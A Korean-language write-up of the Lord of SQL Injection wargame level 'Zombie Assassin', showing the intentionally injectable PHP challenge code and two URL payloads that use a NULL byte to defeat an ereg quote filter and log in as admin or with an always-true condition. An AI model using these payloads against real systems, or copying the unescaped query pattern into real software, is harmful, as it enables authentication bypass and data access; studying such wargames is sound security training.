# Lord of SQL Injection No.16 Zombie Assassin

Zombie Assassin 문제는 `ereg`의 취약점을 이용하도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

```php
if(@ereg("'",$_GET[id])) exit("HeHe");
if(@ereg("'",$_GET[pw])) exit("HeHe");
```

`id`, `pw` 모두 `$_GET` 방식으로 입력을 받는데, `ereg` 함수가 문자열의 `'`을 필터링한 후 `HeHe`를 출력하고 문제 풀이에 실패하게 된다.

#### 문제 풀이 조건
```php
if($result['id']) solve("zombie_assassin");
```

`id`값이 존재하기만 하면 문제 풀이에 성공하게 된다.

## Solution

`ereg` 함수의 취약점은 `no.8 troll` 에서 다룬 적이 있었다.

* [los_writeup - no.8 troll](https://github.com/JaehunYoon/los_writeup/blob/master/los_no8_troll.md)

```
http://los.eagle-jump.org/zombie_assassin_***.php?id=%00%27%20or%20id=%27admin%27%20--%20;
```
`troll` 문제를 풀 때와 마찬가지로 `ereg`가 NULL을 만나 문자열을 더 이상 체크하지 않도록 만들고 `id`값을 임의로 지정해준 후 `pw` 입력 부분은 주석처리를 통하여 무력화시키면 문제 풀이에 성공하게 된다.

```
http://los.eagle-jump.org/zombie_assassin_***.php?id=%00%27%20or%201=1%20--%20;
```
다른 방법으로 NULL로 `ereg`를 종료시킨 후 `1=1` 로 항상 참을 만들어준 후 주석 처리를 해주면 문제 풀이에 성공하게 된다.